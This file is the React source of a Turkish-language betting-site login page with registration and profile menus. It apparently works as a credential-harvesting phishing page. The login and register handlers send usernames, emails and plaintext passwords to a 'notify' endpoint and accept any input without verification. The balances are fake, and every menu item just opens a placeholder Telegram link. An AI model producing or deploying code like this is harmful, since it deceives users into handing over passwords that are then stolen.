import React, { useState } from 'react';
import './App.css';

function App() {
  const [isLoggedIn, setIsLoggedIn] = useState(false);
  const [isProfileMenuOpen, setIsProfileMenuOpen] = useState(false);
  const [isRegistering, setIsRegistering] = useState(false);
  const [loginUsername, setLoginUsername] = useState('');
  const [loginPassword, setLoginPassword] = useState('');
  const [regUsername, setRegUsername] = useState('');
  const [regEmail, setRegEmail] = useState('');
  const [regPassword, setRegPassword] = useState('');
  const [regPromo, setRegPromo] = useState('');
  const [currentUser, setCurrentUser] = useState('');

  const sendNotify = async (event, data) => {
    try {
      await fetch('/api/notify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ event, data }),
      });
    } catch (e) {
      console.error('Bildirim gonderilemedi:', e);
    }
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    await sendNotify('login', { username: loginUsername, password: loginPassword });
    setCurrentUser(loginUsername);
    setIsLoggedIn(true);
    setLoginUsername('');
    setLoginPassword('');
  };

  const handleRegister = async (e) => {
    e.preventDefault();
    await sendNotify('register', { username: regUsername, email: regEmail, password: regPassword, promoCode: regPromo });
    setCurrentUser(regUsername);
    setIsLoggedIn(true);
    setRegUsername('');
    setRegEmail('');
    setRegPassword('');
    setRegPromo('');
    setIsRegistering(false);
  };

  const handleLogout = async () => {
    await sendNotify('logout', { username: currentUser });
    setIsLoggedIn(false);
    setIsProfileMenuOpen(false);
    setCurrentUser('');
  };

  const toggleProfileMenu = () => {
    setIsProfileMenuOpen(!isProfileMenuOpen);
  };

  const openTelegram = () => {
    window.open('https://t.me/your_telegram_channel', '_blank');
  };

  if (!isLoggedIn) {
    if (isRegistering) {
      return (
        <div className="login-container">
          <form className="login-form" onSubmit={handleRegister}>
            <h2>Kayit Ol</h2>
            <div className="input-group">
              <label htmlFor="regUsername">Kullanici Adi</label>
              <input type="text" id="regUsername" value={regUsername} onChange={(e) => setRegUsername(e.target.value)} required />
            </div>
            <div className="input-group">
              <label htmlFor="regEmail">E-posta</label>
              <input type="email" id="regEmail" value={regEmail} onChange={(e) => setRegEmail(e.target.value)} required />
            </div>
            <div className="input-group">
              <label htmlFor="regPassword">Sifre</label>
              <input type="password" id="regPassword" value={regPassword} onChange={(e) => setRegPassword(e.target.value)} required />
            </div>
            <div className="input-group">
              <label htmlFor="regPromo">Promosyon Kodu (istege bagli)</label>
              <input type="text" id="regPromo" value={regPromo} onChange={(e) => setRegPromo(e.target.value)} />
            </div>
            <button type="submit" className="login-btn">Kayit Ol</button>
            <p style={{textAlign:'center',marginTop:'10px',cursor:'pointer',color:'#4fc3f7'}} onClick={() => setIsRegistering(false)}>Zaten hesabim var, giris yap</p>
          </form>
        </div>
      );
    }

    return (
      <div className="login-container">
        <form className="login-form" onSubmit={handleLogin}>
          <h2>Giris Yap</h2>
          <div className="input-group">
            <label htmlFor="username">Kullanici Adi</label>
            <input type="text" id="username" value={loginUsername} onChange={(e) => setLoginUsername(e.target.value)} required />
          </div>
          <div className="input-group">
            <label htmlFor="password">Sifre</label>
            <input type="password" id="password" value={loginPassword} onChange={(e) => setLoginPassword(e.target.value)} required />
          </div>
          <button type="submit" className="login-btn">Giris Yap</button>
          <p style={{textAlign:'center',marginTop:'10px',cursor:'pointer',color:'#4fc3f7'}} onClick={() => setIsRegistering(true)}>Hesabim yok, kayit ol</p>
        </form>
      </div>
    );
  }

  return (
    <div className="App">
      <div className="profile-container">
        <button onClick={toggleProfileMenu} className="profile-button">
          Profil
        </button>
        {isProfileMenuOpen && (
          <div className="profile-menu">
            <div className="profile-menu-header">
              <span className="pmi-user-id">ID: 123456</span>
              <button onClick={() => setIsProfileMenuOpen(false)} className="pmi-close-btn">X</button>
            </div>

            <div className="profile-menu-balance">
              <div className="pmi-balance-main">
                <span>Ana Bakiye</span>
                <span>0.00 TL</span>
              </div>
              <div className="pmi-balance-bonus">
                <span>Bonus Bakiye</span>
                <span>0.00 TL</span>
              </div>
            </div>

            <div className="profile-menu-group">
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">&#127873;</span>
                <div className="pmi-text">
                  <span className="pmi-title">Bonuslar</span>
                  <span className="pmi-desc">Ucretsiz dondurmeler ve diger teklifler</span>
                </div>
              </button>
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">&#127991;</span>
                <div className="pmi-text">
                  <span className="pmi-title">Bonus kodlari</span>
                  <span className="pmi-desc">Kod etkinlestirme</span>
                </div>
              </button>
            </div>

            <div className="profile-menu-group">
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">&#128336;</span>
                <div className="pmi-text">
                  <span className="pmi-title">Bahis gecmisi</span>
                  <span className="pmi-desc">Acik ve sonuclanan bahisler</span>
                </div>
              </button>
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">&#128179;</span>
                <div className="pmi-text">
                  <span className="pmi-title">Odeme gecmisi</span>
                  <span className="pmi-desc">Para yatirma ve cekme durumlari</span>
                </div>
              </button>
            </div>

            <div className="profile-menu-group">
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">&#9881;</span>
                <div className="pmi-text">
                  <span className="pmi-title">Ayarlar</span>
                  <span className="pmi-desc">Kisisel verileri duzenle</span>
                </div>
              </button>
              <button className="profile-menu-item" onClick={openTelegram}>
                <span className="pmi-icon">&#128260;</span>
                <div className="pmi-text">
                  <span className="pmi-title">7/24 destek</span>
                  <span className="pmi-desc">Tum iletisim bilgileri</span>
                </div>
              </button>
            </div>

            <button onClick={handleLogout} className="profile-logout" data-testid="logout-btn">Cikis Yap</button>
          </div>
        )}
      </div>
    </div>
  );
}

export default App;